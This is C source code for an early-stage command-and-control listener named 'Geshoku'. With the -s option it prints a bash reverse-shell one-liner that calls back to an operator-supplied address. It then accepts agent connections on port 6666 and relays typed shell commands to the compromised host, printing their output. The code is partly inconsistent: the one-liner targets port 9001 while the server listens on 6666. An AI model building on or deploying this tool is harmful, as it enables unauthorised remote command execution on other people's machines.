#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <getopt.h>
#include <netinet/in.h>
#include <unistd.h>
#include <string.h>
void welcome_message() {
    printf("-----------Geshoku------------\n");
    printf("------------------------------\n");
    printf("------Version 0.001 Alpha-----\n");
    printf("------------------------------\n\n");
}

void handle_client(int client_socket) {
    char command[1024];
    char buffer[2048];
    int read_size;

    printf("[Info] Agent connected. You can now send commands.\n");

    while (1) {
        // Prompt the user to enter a command
        printf("Shell> ");
        fgets(command, sizeof(command), stdin);

        // Remove the newline character from the end of the command
        command[strcspn(command, "\n")] = '\0';

        // Exit the loop if the user enters "exit"
        if (strcmp(command, "exit") == 0) {
            break;
        }

        // Send the command to the agent
        if (send(client_socket, command, strlen(command), 0) < 0) {
            perror("[Err] Failed to send command");
            break;
        }

        // Receive the output from the agent
        printf("[Info] Command output:\n");
        while ((read_size = recv(client_socket, buffer, sizeof(buffer) - 1, 0)) > 0) {
            buffer[read_size] = '\0';  // Null-terminate the response
            printf("%s", buffer);

            // Break if the output is shorter than the buffer size (indicating end of output)
            if (read_size < sizeof(buffer) - 1) {
                break;
            }
        }

        // If recv() returns 0, the agent has disconnected
        if (read_size == 0) {
            printf("[Info] Agent disconnected\n");
            break;
        } else if (read_size < 0) {
            perror("[Err] Failed to receive data from agent");
            break;
        }
    }

    // Close the client socket
    close(client_socket);
}

void start_server() {
  printf("[Info] Starting HTTP server...\n");
  int sockd=socket(AF_INET,SOCK_STREAM,0);
  int client_socket;
  if(sockd<0){
    perror("[Err] Failed socket creation");
    exit(-1);
  }
  struct sockaddr_in server_addr, client_addr;
  socklen_t client_len=sizeof(client_addr);
  server_addr.sin_family=AF_INET;
  server_addr.sin_addr.s_addr=INADDR_ANY;
  server_addr.sin_port=htons(6666);

  bind(sockd,(struct sockaddr *) &server_addr, sizeof(server_addr));
  printf("[Debug] Binded socket\n"); 
  if(listen(sockd,5)<0){
    perror("[Err] Listening failed");
    close(sockd);
    exit(-1);
  }

  printf("[Info] Geshoku listening on port 6666\n");
  while((client_socket=accept(sockd,(struct sockaddr *)&client_addr,&client_len))>=0) {
    printf("[Info] Received callback from %s:%d\n",inet_ntoa(client_addr.sin_addr),ntohs(client_addr.sin_port));
    handle_client(client_socket);
  }
  
  printf("[Info] Received callback\n");
  //spawn_shell(clientd);
  close(client_socket);
  close(sockd);

}

int main(int argc, char *argv[]) {
    if(argc<2){
        printf("invalid arguments\n");
        return 0;
    }

    int opt;
    while((opt=getopt(argc,argv,"s:h:"))!=-1) {
        switch(opt){
            case 's':
                welcome_message();
                printf("[Info] Reverse shell: sh -i >& /dev/tcp/%s/9001 0>&1\n",optarg);
                start_server();
                break;
            case 'h':
                welcome_message();
                printf("Help command: -h \n");
                break;
            default:
                printf("Invalid option\n");
                return 0;
        }
    }
    return 0;
}
